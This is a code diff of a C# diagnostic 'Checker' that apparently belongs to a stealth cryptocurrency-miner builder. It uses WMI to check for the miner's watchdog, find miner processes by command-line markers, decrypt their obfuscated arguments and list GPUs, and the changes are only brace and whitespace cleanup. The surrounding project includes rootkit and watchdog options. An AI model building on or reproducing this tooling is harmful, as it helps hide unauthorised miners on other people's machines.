@@ -20,10 +20,7 @@ public partial class Checker
     {
         try
         {
-            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
-            {
-                Console.WriteLine("Not run as Administrator, only non-administrator miners can be searched for.");
-            }
+            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) Console.WriteLine("Not run as Administrator, only non-administrator miners can be searched for.");
 
             var _rconnection_ = new ConnectionOptions();
             _rconnection_.Impersonation = ImpersonationLevel.Impersonate;
@@ -34,13 +31,11 @@ public partial class Checker
 #if DefWatchdog
             bool _rwdrunning_ = false;
             foreach (ManagementObject _rmemObj_ in _rsearcher_)
-            {
                 if (_rmemObj_ != null && _rmemObj_["CommandLine"] != null && _rmemObj_["CommandLine"].ToString().Contains(" #WATCHDOGID"))
                 {
                     _rwdrunning_ = true;
                     break;
                 }
-            }
             Console.WriteLine("Watchdog Running: " + (_rwdrunning_ ? "Yes" : "No"));
 #endif
 #if DefRootkit
@@ -50,12 +45,11 @@ public partial class Checker
             _rsearcher_ = new ManagementObjectSearcher(_rscope_, new ObjectQuery("Select CommandLine from Win32_Process")).Get();
             string[] minerset = new string[] { $FINDSET };
             foreach (ManagementObject _rmemObj_ in _rsearcher_)
-            {
                 if (_rmemObj_ != null && _rmemObj_["CommandLine"] != null && minerset.Any(_rmemObj_["CommandLine"].ToString().Contains))
                 {
                     try
                     {
-                        foreach(string _rminer_ in _rmemObj_["CommandLine"].ToString().Split(' '))
+                        foreach (string _rminer_ in _rmemObj_["CommandLine"].ToString().Split(' '))
                         {
                             string _rdecrypted_ = _rUnamlibDecrypt_(_rminer_);
                             if (!string.IsNullOrEmpty(_rdecrypted_))
@@ -67,7 +61,6 @@ public partial class Checker
                     }
                     catch { }
                 }
-            }
 
             string _rgpu_ = "";
             Console.WriteLine("GPUs:");
@@ -84,6 +77,7 @@ public partial class Checker
         {
             Console.WriteLine("Error: " + ex.ToString());
         }
+
         Console.ReadKey();
     }
 
